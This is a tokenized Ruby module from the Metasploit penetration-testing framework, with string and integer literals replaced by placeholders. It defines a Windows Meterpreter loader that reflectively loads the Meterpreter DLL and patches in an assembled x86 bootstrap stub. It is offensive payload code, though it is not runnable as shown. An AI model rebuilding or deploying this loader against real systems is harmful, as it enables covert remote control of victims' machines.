require <str> require <str> module Msf module Payload::Windows::MeterpreterLoader include Msf :: ReflectiveDLLLoader include Msf :: Payload :: Windows def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > ARCH_X86 , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <str> } ) ) end def asm_invoke_metsrv ( opts = { } ) asm = <str> % ( opts [ <str> ] - <int> ) <str> % ( opts [ <str> ] - opts [ <str> ] ) <str> unless opts [ <str> ] asm << <str> end asm << <str> end def stage_meterpreter ( stageless = false ) dll , offset = load_rdi_dll ( MetasploitPayloads . meterpreter_path ( <str> , <str> ) ) asm_opts = { <str> : offset , <str> : dll . length , <str> : stageless } asm = asm_invoke_metsrv ( asm_opts ) bootstrap = Metasm :: Shellcode . assemble ( Metasm :: X86 . new , asm ) . encode_string if bootstrap . length > <int> raise RuntimeError , <str> end dll [ <int> , bootstrap . length ] = bootstrap dll end end end 
